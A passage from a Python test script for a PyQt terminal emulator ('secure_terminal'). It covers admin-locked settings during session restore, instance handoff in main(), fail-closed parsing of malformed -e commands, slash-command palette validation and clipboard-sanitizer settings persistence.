# (mode/tui/colors/line_edits/markings/zoom/theme/scrollback/font) without the
# _locked check it applies to OSC/bell, so a pre-lock session could reload an
# admin-locked terminal in the wrong state. Locked -> the admin DEFAULT wins over
# the saved value; unlocked -> the saved value is still restored. (ai-review)
_rl_saved = set(win._locked)
try:
    _rl_other_mode = next(_m for _m in _MM.DISPLAY_MODES if _m != win._default_mode)
    _rl_info = {
        'text': '', 'osc': {},
        'mode': _rl_other_mode,
        'tui': not win._default_tui,
        'colors': not win._default_colors,
        'line_edits': not win._default_line_edits,
        'markings': not win._default_markings,
        'theme': 'light' if win._default_theme == 'dark' else 'dark',
        'zoom': win._default_zoom + 40,
        'scrollback': win._scrollback + 500,
        'font_family': win._default_font_family,
        'font_size': win._default_font_size + 3,
    }
    win._locked = {'unicode_mode', 'tui', 'colors', 'line_edits',
                   'colored_markings', 'theme', 'zoom', 'scrollback',
                   'font_family', 'font_size'}
    win._restore_tab(_rl_info, activate=True)
    _rt = win.current()
    eq(_rt.current_mode(), win._default_mode, 'restore honours a locked unicode_mode')
    eq(_rt.current_tui(), win._default_tui, 'restore honours a locked tui')
    eq(_rt.colors_enabled(), win._default_colors, 'restore honours a locked colors')
    eq(_rt.line_edits_enabled(), win._default_line_edits,
       'restore honours a locked line_edits')
    eq(_rt.markings_enabled(), win._default_markings,
       'restore honours a locked colored_markings')
    eq(_rt.current_theme(), win._default_theme, 'restore honours a locked theme')
    eq(_rt.current_zoom(), win._default_zoom, 'restore honours a locked zoom')
    eq(_rt.current_scrollback(), win._scrollback, 'restore honours a locked scrollback')
    eq(_rt.current_font_size(), win._default_font_size,
       'restore honours a locked font_size')
    # nothing locked: the saved values are restored, not clobbered by the default
    win._locked = set()
    win._restore_tab(_rl_info, activate=True)
    _ru = win.current()
    eq(_ru.current_mode(), _rl_other_mode, 'restore keeps a saved mode when unlocked')
    eq(_ru.current_scrollback(), win._scrollback + 500,
       'restore keeps a saved scrollback when unlocked')
    eq(_ru.current_zoom(), win._default_zoom + 40,
       'restore keeps a saved zoom when unlocked')
finally:
    win._locked = _rl_saved

# session restore honours a locked allow_title in the LEGACY branch too: a session
# saved before the granular OSC controls carries a bare 'allow_title' bool and NO
# 'osc' key, so _restore_tab takes its legacy branch. That branch applied the saved
# value UNCONDITIONALLY, ignoring the lock the granular branch honours -> a pre-lock
# legacy session could re-enable an admin-locked title/notify capability on restart.
# Locked -> the admin default wins over the saved bool; unlocked -> the saved value
# is restored. Fails on the pre-fix legacy branch (which applied the saved True). (ai-review)
_al_saved_locked = set(win._locked)
_al_saved_default = win._default_allow_title
_al_saved_osc = dict(win._osc_defaults)
try:
    # 1. allow_title locked -> title + notify both forced to the admin default
    win._default_allow_title = False
    win._osc_defaults['osc_title'] = False
    win._osc_defaults['osc_notify'] = False
    win._locked = {'allow_title'}
    win._restore_tab({'text': '', 'allow_title': True}, activate=True)   # legacy, no 'osc'
    ok(not win.current().allow_title_enabled(),
       'legacy restore honours a locked allow_title (admin default wins over the saved bool)')
    # 2. nothing locked -> the saved legacy value is restored
    win._locked = set()
    win._restore_tab({'text': '', 'allow_title': True}, activate=True)   # legacy, no 'osc'
    ok(win.current().allow_title_enabled(),
       'legacy restore keeps the saved allow_title when unlocked')
    # 3. a GRANULAR lock on osc_title alone (allow_title NOT locked) must win in the
    # legacy branch too: osc_title holds the admin default, osc_notify keeps the saved
    # bool. Fails on a fix that only checked 'allow_title' in _locked.
    win._osc_defaults['osc_title'] = False
    win._locked = {'osc_title'}
    win._restore_tab({'text': '', 'allow_title': True}, activate=True)   # legacy, no 'osc'
    _rt = win.current()
    ok(not _rt.osc_enabled('osc_title'),
       'legacy restore honours a granular osc_title lock (default wins over the legacy bool)')
    ok(_rt.osc_enabled('osc_notify'),
       'legacy restore keeps the saved value for the unlocked osc_notify')
finally:
    win._locked = _al_saved_locked
    win._default_allow_title = _al_saved_default
    win._osc_defaults = _al_saved_osc

# a NEW tab opens in the ACTIVE tab's current working directory (like konsole), not the
# app's launch dir. Restore a tab into a known cwd, wait for its shell to land there, then
# open a new tab and confirm it spawned in that same dir (bug: new tabs used the launch dir).
_ncwd = tempfile.mkdtemp(prefix='st-newtab-cwd-')
win._restore_tab({'text': '', 'cwd': _ncwd, 'osc': {}})
_nactive = win.current()
for _ in range(60):
    if (_nactive.shell_cwd()
            and os.path.realpath(_nactive.shell_cwd()) == os.path.realpath(_ncwd)):
        break
    pump(10)
win.new_tab()
_nnew = win.current()
_ncwd_ok = False
for _ in range(60):
    try:
        if os.path.realpath(os.readlink('/proc/%d/cwd' % _nnew._pid)) \
                == os.path.realpath(_ncwd):
            _ncwd_ok = True
            break
    except OSError:
        ## /proc/<pid>/cwd unreadable until the forked child has chdir'd + exec'd.
        pass
    pump(10)
ok(_ncwd_ok, 'a new tab opens in the ACTIVE tab current working directory')

# set_tui refuses + reverts the toggle when a program is running (the shell's
# terminfo cannot be re-exported under a running program) -- #63.
_stt = win.current()
_stt_fg = _stt.has_foreground_program
_stt.has_foreground_program = lambda: True
_stt_before = win.act_tui.isChecked()
win.set_tui(not _stt_before)
ok(win.act_tui.isChecked() == _stt.current_tui(),
   'set_tui reverts the toggle to the actual mode when a program is running')
_stt.has_foreground_program = _stt_fg

# P2 (ai-review): a refused switch must NOT clobber the global default. The revert
# setChecked would re-enter set_tui(actual) and persist it as _default_tui; blocked
# signals stop that. Set the default DIFFERENT from the tab's mode to catch it.
_stt._tui = False                              # this tab is CLI
_saved_def = win._default_tui
win._default_tui = True                        # global default differs from the tab
win.act_tui.blockSignals(True)
win.act_tui.setChecked(True)                   # as if the user toggled TUI on
win.act_tui.blockSignals(False)
_stt.has_foreground_program = lambda: True      # a program blocks the switch
win.set_tui(True)                              # refused -> revert must not re-enter
eq(win._default_tui, True,
   'set_tui: a refused switch does not clobber the global TUI default (P2)')
ok(not win.act_tui.isChecked(), 'the refused toggle reverted to the tab mode (CLI)')
_stt.has_foreground_program = _stt_fg
win._default_tui = _saved_def

# bind the single-instance listening socket (isolated runtime dir)
_bind_status = win.start_instance_server('coverage-group')
ok(_bind_status == 'claimed',
   'start_instance_server binds a listening socket (claims the free group)')

# --- main(): the entry point, driven with QApplication + exec + ipc mocked ----
import signal as _signal                             # noqa: E402
from secure_terminal.main import main as _main       # noqa: E402
from PyQt6.QtWidgets import QApplication as _QA       # noqa: E402

import io as _io                                       # noqa: E402
import contextlib as _ctx                              # noqa: E402

_o_argv = sys.argv[:]
_o_sr = M.ipc.send_request
_o_qa = M.QApplication
_o_qexec = _QA.exec
_o_chld = _signal.getsignal(_signal.SIGCHLD)
try:
    # `ctl` subcommand is dispatched before Qt
    M.ipc.send_request = lambda *_a, **_k: {'ok': True, 'tabs': []}
    sys.argv = ['secure-terminal', 'ctl', 'ls']
    eq(_main(), 0, 'main: a `ctl` argv dispatches to the ctl client')
    # --test-canary fires the headless positive control
    sys.argv = ['secure-terminal', '--new-instance', '--test-canary']
    eq(_main(), 0, 'main: --test-canary runs the headless canary before Qt')
    # --reuse: hand off to the running primary -> exit 0 without starting Qt.
    # (Reuse is the ONLY path that hands off now; a bare launch always builds its
    # own window -- see the new-window test below and the no-handoff regression.)
    M.ipc.send_request = lambda *_a, **_k: {'ok': True}
    sys.argv = ['secure-terminal', '--reuse', '--title', 'x']
    eq(_main(), 0, 'main: --reuse hands off to an existing instance -> 0')
    # the primary refusing the handoff -> exit 1
    M.ipc.send_request = lambda *_a, **_k: {'ok': False, 'error': 'refused'}
    eq(_main(), 1, 'main: --reuse to an instance that refuses -> 1')
    # no running instance -> full startup (QApplication + window + event loop),
    # with the app object and its blocking exec() replaced
    M.ipc.send_request = lambda *_a, **_k: None

    class _AppProxy:                        # call -> the existing app; else delegate
        def __call__(self, _argv):
            return APP

        def __getattr__(self, _name):
            return getattr(_QA, _name)

    M.QApplication = _AppProxy()
    _QA.exec = lambda _self: 0

    # Pin the default-font check present (see _FontDBPresent) so the startup tests
    # here do not depend on fonts-hack being installed.
    M.QFontDatabase = _FontDBPresent
    sys.argv = ['secure-terminal', '--title', 'fresh']
    eq(_main(), 0, 'main: with no running instance it starts the app + event loop')

    # REGRESSION (the core bug): a bare launch (no --reuse) must NEVER hand off to
    # a running instance -- it builds its OWN window. Record every request main()
    # sends and assert no 'open' handoff is issued without --reuse, but IS issued
    # with it. send_request returns a reply so that a mistaken handoff would
    # short-circuit before Qt -- making a regression observable as a wrong result
    # rather than a hang.
    _seen_ops = []

    def _rec(_group, req, *_a, **_k):
        _seen_ops.append(req.get('op'))
        return {'ok': True} if req.get('op') == 'open' else None

    M.ipc.send_request = _rec
    _seen_ops.clear()
    sys.argv = ['secure-terminal', '--title', 'bare']
    eq(_main(), 0, 'main: a bare launch builds its own window')
    ok('open' not in _seen_ops,
       'main: a bare launch sends NO open handoff (new independent window)')
    _seen_ops.clear()
    sys.argv = ['secure-terminal', '--reuse', '--title', 'joined']
    eq(_main(), 0, 'main: --reuse issues the open handoff and exits')
    ok('open' in _seen_ops,
       'main: --reuse DOES send an open handoff to the primary')
    M.ipc.send_request = lambda *_a, **_k: None

    # --reuse whose 1.5s ping finds nothing but the socket IS live (a briefly-busy
    # primary): main() retries via _handoff, which answers -> exit 0 before Qt.
    # Neither case below builds a window (both return in the reuse/claim block), so
    # they cannot perturb the delicate window-building startup tests above.
    _o_sil = M.ipc.socket_is_live
    _o_ho = M._handoff
    _o_bind = M._bind_instance_server
    M.ipc.socket_is_live = lambda *_a, **_k: True
    M._handoff = lambda *_a, **_k: {'ok': True}
    sys.argv = ['secure-terminal', '--reuse', '--title', 'busy']
    eq(_main(), 0, 'main: --reuse to a bound-but-busy primary retries via _handoff -> 0')
    # --reuse that found no primary, then LOST the atomic bind to a peer that became
    # primary meanwhile: _bind returns peer_owns and main() hands off via _handoff.
    M.ipc.socket_is_live = lambda *_a, **_k: False   # skip the busy-peer retry above
    M._bind_instance_server = lambda *_a, **_k: (None, 'peer_owns')
    sys.argv = ['secure-terminal', '--reuse', '--title', 'raced']
    eq(_main(), 0, 'main: --reuse losing the bind race hands off to the new primary -> 0')
    # --reuse that DEFERRED to a live peer which then DIED mid-handoff (a RESTART: the
    # old primary is still bound when we launch, so we defer, then it exits). _handoff
    # returns None, so main() must RE-CLAIM the freed socket -- else it opens a
    # server-less window and the group has NO primary, so every later --reuse opens
    # yet another window (the reported duplicate-window regression). Here the re-claim
    # finds nothing to take ('failed') so the window is server-less, but the re-claim
    # LINE runs; without it there is no second attempt at all.
    _bind_seq = [(None, 'peer_owns'), (None, 'failed')]
    M._bind_instance_server = lambda *_a, **_k: _bind_seq.pop(0)
    M._handoff = lambda *_a, **_k: None
    sys.argv = ['secure-terminal', '--reuse', '--title', 'peerdied']
    eq(_main(), 0,
       'main: --reuse whose peer died mid-handoff re-claims (no lingering primary-less window)')
    M.ipc.socket_is_live = _o_sil
    M._handoff = _o_ho
    M._bind_instance_server = _o_bind
    M.ipc.send_request = lambda *_a, **_k: None

    # _require_default_font: the Hack font (fonts-hack) is a hard dependency. Qt
    # would SILENTLY substitute a fallback that may reintroduce the confusable
    # glyphs / ligatures Hack is chosen to avoid, so a missing default font fails
    # loud like a missing Python dependency (preflight.require) -- main() aborts
    # with exit 1 before building a window. Drive both branches via the module's
    # QFontDatabase alias (present is pinned above for the other startup tests).
    class _FontDBAbsent:
        @staticmethod
        def families():
            return ['DejaVu Sans Mono', 'monospace']

    ok(M._require_default_font() is True,
       'font: _require_default_font True when the default family is installed')
    M.QFontDatabase = _FontDBAbsent
    _err = _io.StringIO()
    with _ctx.redirect_stderr(_err):
        ok(M._require_default_font() is False,
           'font: _require_default_font False when the default family is missing')
    ok('fonts-hack' in _err.getvalue(),
       'font: the missing-font message names the fonts-hack package')
    # Drive the REAL QFontDatabase.families() path so an API break (as hasFamily
    # was removed in Qt6) is caught here, without assuming Hack is installed.
    M.QFontDatabase = _REAL_QFONTDB
    with _ctx.redirect_stderr(_io.StringIO()):
        ok(isinstance(M._require_default_font(), bool),
           'font: _require_default_font uses a live QFontDatabase API (returns bool)')
    M.QFontDatabase = _FontDBPresent    # restore present for the shot test below
    # NOTE: the exit-1 wiring (main() -> `return 1`) is asserted in the block below,
    # AFTER the threaded single-instance handoff test -- an extra main() call BEFORE
    # that delicate block destabilizes it into an intermittent segfault.

    # SECURE_TERMINAL_SHOT=1 (#51 deterministic screenshot mode): main() stops the
    # app-wide caret blink so no captured frame depends on the caret phase. Drive the
    # full startup with the env set and confirm _shot_mode() takes the shot branch
    # (setCursorFlashTime(0)); with the env unset it is a no-op (covered above).
    ok(M._shot_mode() is False, 'shot: _shot_mode() is False when the env is unset')
    os.environ['SECURE_TERMINAL_SHOT'] = '1'
    _o_flash = APP.cursorFlashTime()
    try:
        ok(M._shot_mode() is True, 'shot: SECURE_TERMINAL_SHOT=1 -> _shot_mode() True')
        sys.argv = ['secure-terminal', '--title', 'shot']
        eq(_main(), 0, 'shot: main() starts with SECURE_TERMINAL_SHOT=1')
        eq(APP.cursorFlashTime(), 0, 'shot: main() stops the caret blink (flash time 0)')
    finally:
        del os.environ['SECURE_TERMINAL_SHOT']
        APP.setCursorFlashTime(_o_flash)

    # --clipboard-watch: the tray-only clipboard sanitizer, dispatched early in
    # main() (opening no terminal window). With no system tray (offscreen) its
    # run() returns 1; this covers the dispatch branch and _clipboard_watch_main.
    # Placed AFTER the delicate threaded-handoff + shot tests so it cannot perturb
    # them (see the note above).
    _o_qlwc = APP.quitOnLastWindowClosed()
    sys.argv = ['secure-terminal', '--clipboard-watch']
    eq(_main(), 1, 'main: --clipboard-watch runs the tray sanitizer (no tray -> 1)')
    APP.setQuitOnLastWindowClosed(_o_qlwc)
    # its own font-missing abort (like the normal path, it fails loud before Qt work)
    M.QFontDatabase = _FontDBAbsent
    with _ctx.redirect_stderr(_io.StringIO()):
        eq(_main(), 1,
           'main: --clipboard-watch aborts (exit 1) when the default font is missing')
    M.QFontDatabase = _FontDBPresent
finally:
    sys.argv = _o_argv
    M.ipc.send_request = _o_sr
    M.QApplication = _o_qa
    _QA.exec = _o_qexec
    M.QFontDatabase = _REAL_QFONTDB
    _signal.signal(_signal.SIGCHLD, _o_chld)

# --- launch parsing: the instance dispositions are mutually exclusive ----------
# --reuse (join the primary) and --new-instance (standalone, never the primary)
# directly contradict; --window is the explicit default. The parser must reject
# any two together (argparse SystemExit) and parse each alone.
_pla = M._parse_launch_args
ok(_pla(['--reuse']).reuse is True and _pla(['--reuse']).new_instance is False,
   'parse: --reuse alone -> reuse')
ok(_pla(['--window']).reuse is False and _pla(['--window']).new_instance is False,
   'parse: --window alone -> new independent window (the default)')
ok(_pla(['--new-instance']).new_instance is True and _pla(['--new-instance']).reuse is False,
   'parse: --new-instance alone -> standalone')
for _combo in (['--reuse', '--new-instance'], ['--window', '--new-instance'],
               ['--reuse', '--window']):
    _rej = False
    try:
        _pla(_combo)
    except SystemExit:
        _rej = True
    ok(_rej, 'parse: %s is rejected (mutually exclusive dispositions)' % ' '.join(_combo))

# --if-absent (idempotent reuse) parses and flows into the open request.
ok(_pla(['--if-absent']).if_absent is True, 'parse: --if-absent -> if_absent')
ok(_pla([]).if_absent is False, 'parse: if_absent defaults off')
_lreq = M._launch_to_request(_pla(['--if-absent', '--title', 't', '--', 'cmd']))
ok(_lreq['op'] == 'open' and _lreq.get('if_absent') is True,
   'launch->request: if_absent flows into the open request')
ok(M._launch_to_request(_pla([])).get('if_absent') is False,
   'launch->request: if_absent defaults off in the request')

# Fail CLOSED on a malformed -e STRING before Qt: a locked-down launch (run ONLY this
# program) must not silently drop to a login shell on a bad quote. A -- prog args LIST
# is verbatim (never shlex'd, exempt); a well-formed -e string is accepted. (canary:
# the old parser built a spec with the malformed string, which _argv_for_command then
# turned into a login shell.)
_reje = False
try:
    _pla(['-e', "printf 'unterminated"])
except SystemExit as _se:
    _reje = (_se.code == 2)
ok(_reje, 'parse: a malformed -e STRING exits(2), never a login shell (fail closed)')
# agy: a WHITESPACE-only -e (shell-splits to no words) also fails closed at parse.
_rejw = False
try:
    _pla(['-e', '   '])
except SystemExit as _sew:
    _rejw = (_sew.code == 2)
ok(_rejw, 'parse: a whitespace-only -e STRING exits(2), never a login shell')
# codex: an empty program name (`-e '""'`) also fails closed at parse.
_reje2 = False
try:
    _pla(['-e', '""'])
except SystemExit as _se2:
    _reje2 = (_se2.code == 2)
ok(_reje2, 'parse: an empty-program -e STRING (\'""\') exits(2), never a login shell')
# codex: a TRULY EMPTY -e (`-e ""` -> cmd == '', zero-length, distinct from the 2-char
# '""' above) also names no program. The old check `isinstance(cmd, str) and cmd` skipped
# the empty string (falsy) so _argv_for_command dropped to a LOGIN SHELL -- a locked
# launcher whose cmd var went empty failed OPEN. (canary: old code raised no SystemExit.)
_rejempty = False
try:
    _pla(['-e', ''])
except SystemExit as _see:
    _rejempty = (_see.code == 2)
ok(_rejempty, 'parse: a truly-empty -e ("") exits(2), never a login shell (fail closed)')
ok(_pla(['-e', 'echo ok']).tabs[-1]['command'] == 'echo ok',
   'parse: a well-formed -e string is accepted (shell-split at spawn, not here)')
ok(_pla(['--', 'echo', "'unbalanced"]).tabs[-1]['command'] == ['echo', "'unbalanced"],
   'parse: a -- LIST command is verbatim, NOT shlex-validated (no false reject)')
# #44 (agy): a -- LIST whose FIRST element is empty/whitespace ('' from `-- ""`) names no
# program, so it fails closed too -- verbatim applies only to a REAL first arg, else the
# list path drops to a login shell (the string path already fails closed).
_rejl = False
try:
    _pla(['--', ''])
except SystemExit as _sel:
    _rejl = (_sel.code == 2)
ok(_rejl, '#44: a -- LIST with an empty first element exits(2), never a login shell')
_rejl2 = False
try:
    _pla(['--', '  ', 'arg'])
except SystemExit as _sel2:
    _rejl2 = (_sel2.code == 2)
ok(_rejl2, '#44: a -- LIST with a whitespace-only first element also exits(2)')

# --- set_* admin-locked returns + bell channels + run_command palette ---------
from PyQt6.QtWidgets import QMessageBox                          # noqa: E402
_o_info = QMessageBox.information
_o_warn = QMessageBox.warning
QMessageBox.information = staticmethod(lambda *_a, **_k: None)
QMessageBox.warning = staticmethod(lambda *_a, **_k: None)
_sl = set(win._locked)
try:
    win._locked = {'osc_notice'}
    win.set_osc_notice(True)
    win._locked = {'tui_autobox_notice'}
    win.set_tui_autobox_notice(False)       # admin-locked -> refused
    win._locked = {'tui'}
    win.set_tui(True)
    win._locked = {'allow_title'}
    win.set_allow_title(True)
    win._locked = {'bell'}
    win.set_bell_channel('audible', True)    # locked -> refused
    _lk_bell = 'audible' in win.current().bell_channels()
    win._locked = {'osc_title'}
    win.set_osc('osc_title', True)           # locked -> refused
    _lk_osc = win.current().osc_enabled('osc_title')
    win._locked = {'allow_title'}
    win.set_osc('osc_title', True)           # the allow_title -> osc_* lock path -> refused
    _lk_osc_alias = win.current().osc_enabled('osc_title')
    win._locked = set()
    win.set_bell_channel('tray', True)       # unlocked -> added
    _add_tray = 'tray' in win.current().bell_channels()
    win.set_bell_channel('tray', False)      # unlocked -> removed
    _rm_tray = 'tray' not in win.current().bell_channels()
    ok(not _lk_bell and not _lk_osc and not _lk_osc_alias and _add_tray and _rm_tray,
       'admin locks refuse bell / osc_title / allow_title->osc_title; '
       'unlocked bell channels add and remove (read-back)')
    for _c in ('help', 'theme dark', 'mode reveal', 'colors on', 'tui on',
               'title on', 'zoom 120', 'scrollback 1000', 'paste-delay 3',
               'escape-limit 65536', 'pastedelay 4', 'totally-unknown', '/'):
        win.run_command('/' + _c)
    eq(win.run_command(''), False, 'run_command: an empty line -> False')
    # str.isdigit() accepts non-ASCII digit-likes (superscript 2) that int() rejects; the
    # numeric palette commands must treat those as invalid, not raise an uncaught ValueError.
    for _bad in ('/zoom \u00b2', '/scrollback \u00b2', '/paste-delay \u00b2',
                 '/escape-limit \u00b2'):
        eq(win.run_command(_bad), False,
           'run_command: a non-ASCII digit arg (%r) is rejected, not a crash' % _bad)
    # a palette /scrollback beyond Qt's C int32 must clamp at the apply_scrollback sink,
    # not SIGABRT via setMaximumBlockCount -- the sink clamp protects every caller.
    eq(win.run_command('/scrollback 99999999999999'), True,
       'run_command: an out-of-int32 /scrollback is accepted (clamped, not a crash)')
    eq(win.current().current_scrollback(), 2147483647,
       'an out-of-int32 scrollback clamps to int32 max at the apply_scrollback sink')
    # a pathologically long all-digit arg (over CPython's int_max_str_digits, ~4300)
    # makes int() ITSELF raise ValueError; the length bound must reject it as invalid,
    # never let an uncaught ValueError escape the Qt slot and abort the process.
    for _cmd in ('/zoom ', '/scrollback ', '/paste-delay ', '/escape-limit '):
        eq(win.run_command(_cmd + '9' * 5000), False,
           'run_command: an over-4300-digit arg to %r is rejected, not an int() crash'
           % _cmd.strip())
    ok(True, 'run_command handles every slash-command branch')

    # CLASH: the palette's help text vs what the palette actually dispatches.
    # Driving every branch (above) proves only that nothing raises -- it cannot
    # notice a command the help omits, which is how `/mode detail` went
    # undocumented while being the DEFAULT mode everywhere else.
    import ast as _ast
    import inspect as _inspect
    import re as _re

    from secure_terminal import sanitize as _san

    _help_cmds = set(_re.findall(r'/([a-z][a-z-]*)', MainWindow._COMMAND_HELP))
    # The dispatched names: every string literal compared against `cmd` in
    # run_command, derived from the source so a new branch cannot hide.
    _src = _inspect.getsource(MainWindow.run_command)
    _tree = _ast.parse(_src.lstrip())
    _dispatched = set()
    for _node in _ast.walk(_tree):
        if not isinstance(_node, _ast.Compare):
            continue
        if not (isinstance(_node.left, _ast.Name) and _node.left.id == 'cmd'):
            continue
        for _cmp in _node.comparators:
            if isinstance(_cmp, _ast.Constant) and isinstance(_cmp.value, str):
                _dispatched.add(_cmp.value)
            elif isinstance(_cmp, (_ast.Tuple, _ast.List, _ast.Set)):
                for _elt in _cmp.elts:
                    if isinstance(_elt, _ast.Constant) and isinstance(_elt.value, str):
                        _dispatched.add(_elt.value)
    ok(len(_dispatched) >= 8,
       'the run_command dispatch list was extracted (%d names)' % len(_dispatched))
    # An undocumented alias is the finding; `help` is documented and dispatched.
    eq(sorted(_dispatched - _help_cmds), [],
       'every dispatched slash command appears in the palette help')
    eq(sorted(_help_cmds - _dispatched), [],
       'every command in the palette help is actually dispatched')

    # ...and the /mode alternatives must be the real mode list, not a subset.
    _mode_line = [ln for ln in MainWindow._COMMAND_HELP.split('\n')
                  if ln.strip().startswith('/mode')]
    eq(len(_mode_line), 1, 'the palette help documents /mode exactly once')
    eq(sorted(_mode_line[0].split(None, 1)[1].split('|')), sorted(_san.DISPLAY_MODES),
       'the /mode alternatives in the help equal sanitize.DISPLAY_MODES')
finally:
    win._locked = _sl
    QMessageBox.information = _o_info
    QMessageBox.warning = _o_warn

# --- clipboard-sanitizer controls (menu / setters / systray coupling) ----------
from secure_terminal import clipboard_watch as _cw                # noqa: E402
from PyQt6.QtCore import QMimeData, QProcess                       # noqa: E402
from PyQt6.QtWidgets import QMenu                                  # noqa: E402

_cw_saved = (_cw.is_running, _cw.stop_running, _cw.push_warn_any,
             _cw.set_autostart, _cw.autostart_enabled)
_o_startdet = QProcess.startDetached
_o_avail_c = QSystemTrayIcon.isSystemTrayAvailable
_o_systray_c = win._systray
_o_warnany_c = win._clip_warn_any
## Save the process clipboard (every MIME format) and restore it in finally:
## the test overwrites it, and a bare clear() would discard a developer's real
## clipboard on a live (non-offscreen) desktop session.
_o_clip_c = QMimeData()
_src_clip_c = APP.clipboard().mimeData()   # None under the offscreen platform
if _src_clip_c is not None:
    for _clip_fmt_c in _src_clip_c.formats():
        _o_clip_c.setData(_clip_fmt_c, _src_clip_c.data(_clip_fmt_c))
_calls: dict[str, object] = {}
try:
    _cw.is_running = lambda: _calls.get('running', False)
    _cw.stop_running = lambda: _calls.__setitem__('stopped', True)
    _cw.push_warn_any = lambda v: _calls.__setitem__('pushed', v)
    _cw.set_autostart = lambda v: _calls.__setitem__('autostart', v)
    _cw.autostart_enabled = lambda: _calls.get('autostart_state', True)
    QProcess.startDetached = staticmethod(
        lambda *a, **k: _calls.__setitem__('launched', True))

    _calls.clear(); _calls['running'] = False
    win.set_clip_run(True)
    ok('launched' in _calls, 'clip: set_clip_run(True) launches the daemon when absent')
    _calls.clear(); _calls['running'] = True
    win.set_clip_run(True)
    ok('launched' not in _calls, 'clip: set_clip_run(True) idempotent when already running')
    _calls.clear()
    win.set_clip_run(False)
    ok(_calls.get('stopped'), 'clip: set_clip_run(False) stops the daemon')

    win.set_clip_warn_any(True)
    ok(win._clip_warn_any is True, 'clip: set_clip_warn_any records the setting')
    eq(_calls.get('pushed'), True, 'clip: set_clip_warn_any live-updates the daemon')
    win.set_clip_warn_any(False)

    ## Finding-2 regression: the clipboard-watch tray persists clip_warn_any via a
    ## single-key write; a later terminal _persist (a bulk write for some OTHER
    ## setting) must PRESERVE it, not clobber it with the terminal's stale value.
    from secure_terminal import settings as _st_clip   # noqa: PLC0415
    # isolate the privileged dirs to an EMPTY temp dir: a real admin lock= on
    # clip_warn_any (a supported /etc config) would otherwise pin the value and
    # false-fail this no-clobber check.
    _clip_sysd = tempfile.mkdtemp(prefix='st-clipsys-')
    _clip_orig_sysd = _st_clip._system_dirs
    _st_clip._system_dirs = lambda: [_clip_sysd]
    try:
        _st_clip.set_user_key('clip_warn_any', 'true')  # the tray toggles it ON on disk
        win._clip_warn_any = False                       # the terminal's stale in-memory value
        win._persist()                                   # a bulk write for another setting
        ok(_st_clip.load().get('clip_warn_any') == 'true',
           'terminal _persist preserves the tray-set clip_warn_any (no clobber)')
    finally:
        _st_clip._system_dirs = _clip_orig_sysd

    # Fix-3: Global-settings Apply must NOT write clip_warn_any when the user did
    # not toggle it here -- the daemon may have changed it on disk since the dialog
    # opened, so a theme-only Apply must leave the daemon value and not push a stale
    # checkbox to a running daemon.
    _clip_sysd3 = tempfile.mkdtemp(prefix='st-clipsys3-')
    _clip_orig_sysd3 = _st_clip._system_dirs
    _st_clip._system_dirs = lambda: [_clip_sysd3]
    try:
        win._clip_warn_any = False                       # dialog opened with it OFF
        _st_clip.set_user_key('clip_warn_any', 'true')   # daemon turns it ON afterwards
        _calls.clear()
        win._apply_global({'theme': 'dark', 'zoom': 100, 'mode': 'box',
                           'colors': True, 'line_edits': True, 'scrollback': 1000,
                           'paste_delay': 3, 'escape_limit': 4096, 'persist': False,
                           'clip_warn_any': False})       # unchanged from win._clip_warn_any
        eq(_st_clip.load().get('clip_warn_any'), 'true',
           'apply: a clip_warn_any unchanged in the dialog is not clobbered')
        ok('pushed' not in _calls,
           'apply: no daemon push when clip_warn_any was not toggled')
        # ...but a value the user DID toggle here is written to DISK and pushed.
        _st_clip.set_user_key('clip_warn_any', 'false')  # reset disk so the write shows
        win._clip_warn_any = False
        _calls.clear()
        win._apply_global({'theme': 'dark', 'zoom': 100, 'mode': 'box',
                           'colors': True, 'line_edits': True, 'scrollback': 1000,
                           'paste_delay': 3, 'escape_limit': 4096, 'persist': False,
                           'clip_warn_any': True})        # toggled ON in the dialog
        ok(win._clip_warn_any is True and _calls.get('pushed') is True
           and _st_clip.load().get('clip_warn_any') == 'true',
           'apply: a clip_warn_any toggled in the dialog is written to disk and pushed')
    finally:
        _st_clip._system_dirs = _clip_orig_sysd3

    # _persist must DROP a key locked at STARTUP (win._locked) even when it is not
    # currently locked in the system config -- i.e. it passes its startup snapshot
    # to update_user. Isolate the privileged dirs to an empty dir so load() locks
    # nothing; only win._locked should cause the drop.
    _pl_sysd = tempfile.mkdtemp(prefix='st-plsys-')
    _pl_usrd = tempfile.mkdtemp(prefix='st-plusr-')
    _pl_o_sys, _pl_o_usr = _st_clip._system_dirs, _st_clip._user_config_dir
    _pl_o_locked, _pl_o_theme = set(win._locked), win._default_theme
    _st_clip._system_dirs = lambda: [_pl_sysd]
    _st_clip._user_config_dir = lambda: _pl_usrd
    try:
        win._locked = frozenset({'theme'})              # theme locked at launch
        win._default_theme = 'dark'
        win._persist()
        _pw = {}
        _st_clip._parse_into(_st_clip.user_config_file(), _pw)
        ok('theme' not in _pw and 'zoom' in _pw,
           '_persist drops a startup-locked key (theme) but writes the rest')
    finally:
        win._locked, win._default_theme = _pl_o_locked, _pl_o_theme
        _st_clip._system_dirs, _st_clip._user_config_dir = _pl_o_sys, _pl_o_usr

    QSystemTrayIcon.isSystemTrayAvailable = staticmethod(lambda: True)
    win._systray = True
    ok(win._clip_controls_enabled(), 'clip: controls enabled when systray on + available')
    win._systray = False
    ok(not win._clip_controls_enabled(), 'clip: controls disabled when systray off')
    QSystemTrayIcon.isSystemTrayAvailable = staticmethod(lambda: False)
    win._systray = True
    ok(not win._clip_controls_enabled(), 'clip: controls disabled when no tray available')

    # set_clip_autostart is gated on the controls; off always applies
    win._systray = False
    _calls.pop('autostart', None)
    win.set_clip_autostart(True)
    ok('autostart' not in _calls, 'clip: set_clip_autostart(True) refused with no tray')
    QSystemTrayIcon.isSystemTrayAvailable = staticmethod(lambda: True)
    win._systray = True
    win.set_clip_autostart(True)
    eq(_calls.get('autostart'), True, 'clip: autostart on when controls enabled')
    win.set_clip_autostart(False)
    eq(_calls.get('autostart'), False, 'clip: autostart off always applies')

    # populate both tooltip branches + the context-menu injection
    win._systray = False
    _m = QMenu()
    win._populate_clipboard_menu(_m)
    ok(len(_m.actions()) >= 4, 'clip: menu populated (disabled-controls branch)')
    win._systray = True
    _m2 = QMenu()
    win._populate_clipboard_menu(_m2)
    ok(len(_m2.actions()) >= 4, 'clip: menu populated (enabled-controls branch)')
    _ctxmenu = QMenu()
    win.add_terminal_context_actions(_ctxmenu)
    ok(any(a.text() == 'System tray icon' for a in _ctxmenu.actions()),
       'clip: context menu gains the system-tray toggle')

    # systray coupling: turning the tray OFF clears clipboard autostart only when on
    QSystemTrayIcon.isSystemTrayAvailable = _o_avail_c
    win._systray = False
    _calls.clear(); _calls['autostart_state'] = True
    win.set_systray(False)
